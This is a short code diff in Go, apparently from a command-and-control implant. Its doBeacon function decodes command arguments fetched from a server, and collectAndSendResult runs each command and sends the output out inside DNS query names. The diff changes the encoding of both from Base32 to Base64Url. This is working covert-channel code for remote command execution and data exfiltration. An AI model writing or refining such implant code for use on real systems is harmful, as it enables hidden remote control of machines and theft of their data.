@@ -94,7 +94,7 @@ func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command, str
 	var commandArgs []string
 
 	for _, arg := range commandArgsEncoded {
-		decoded, err := encoding.Base32Decode(arg)
+		decoded, err := encoding.Base64UrlDecode(arg)
 		if err != nil {
 			log.Log("Error decoding command arg:", err)
 			return
@@ -116,7 +116,7 @@ func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command, str
 
 func collectAndSendResult(cmd commands.Command, commandArgs []string, job string) {
 	result := cmd.Execute(commandArgs)
-	dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
+	dns.DnsQuery(encoding.Base64UrlEncode(result) + "." + job)
 }
 
 func collectAndSendStreamResult(cmd commands.StreamCommand, commandArgs []string, job string) {
